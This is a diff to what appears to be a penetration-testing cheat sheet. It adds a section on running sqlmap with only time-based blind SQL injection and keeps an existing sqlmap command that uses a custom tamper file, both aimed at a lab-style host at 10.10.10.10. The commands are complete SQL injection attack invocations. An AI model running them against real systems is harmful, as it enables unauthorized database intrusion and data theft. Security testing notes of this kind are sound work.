@@ -33,6 +33,13 @@ You can  install this tamper simply by coping the file to your /usr/share/sqlmap
 ```bash
 sqlmap -u "http://10.10.10.10:80/index.php" --data="name=12345678901*&email=test<here>@test.com&password=test12345" --method="POST" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 -p "name" --dbms="MySQL" --os=Linux --level=5 --risk=3 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N" --tamper=chargen.py
 ```
+
+## SQLMap test only blind timing based SQL injection techniques 
+Testing only the timing based attacks using the --technique=T parameter
+```
+sqlmap -u "http://10.10.10.10/profile.php" --data="name=1234567890*" --method="POST" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --os=Linux --level=5 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N" --technique=T
+```
+
 ## Create a custom SQLMap tamper file
 I ran into a scenario today where I wanted to test a SQL create new user page for a SQL injection.  
 Tampers can be easily edited and replaced here:
